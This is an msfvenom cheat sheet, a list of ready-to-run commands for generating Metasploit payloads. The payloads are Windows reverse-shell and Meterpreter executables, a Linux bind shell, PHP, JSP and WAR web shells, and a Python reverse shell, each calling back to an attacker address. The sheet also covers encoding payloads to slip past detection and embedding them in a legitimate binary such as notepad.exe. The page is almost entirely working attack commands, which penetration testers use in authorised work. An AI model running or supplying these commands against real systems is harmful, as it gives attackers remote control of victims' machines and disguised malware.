# msfvenom

Short cut on some shellcode creations:

- ```msfvenom -l payloads```
- ```EXITFUNC=thread, SEH, process, none```
- ```–e x86/shikata_ga_nai, generic/none```
- ```-i 4``` (Iterations)
- ```-x /directory/notepad.exe``` (Embedded)
- ```-f war, exe, c, php, py, asp, raw```
- ```-p / --platform```
- ```--arch, -a x86 x86_64```


- Windows
  - ```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f js_le``` (Unicode)
  - ```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f c``` (C format)
  - ```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f c -b "\x00"``` (Encoded C)
  - ```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f exe -o shell_reverse.exe```
  - ```msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.5 LPORT=443 -f exe -o naughty.exe``` (Multi-handler)
  
- Linux
  - ```msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00"``` (Bind 32 bit)
  
- Web
  - ```msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=443 -f raw > shell.php```
  - ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f raw > shell.jsp```
  - ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -f war > shell.war```
  
- Script
  - ```msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.1 LPORT=443 -f raw > shell.py```
  
  
Useful Links:
- http://security-geek.in/2016/09/07/msfvenom-cheat-sheet/
- https://www.aboureada.com/shells/2017/12/17/shells.html
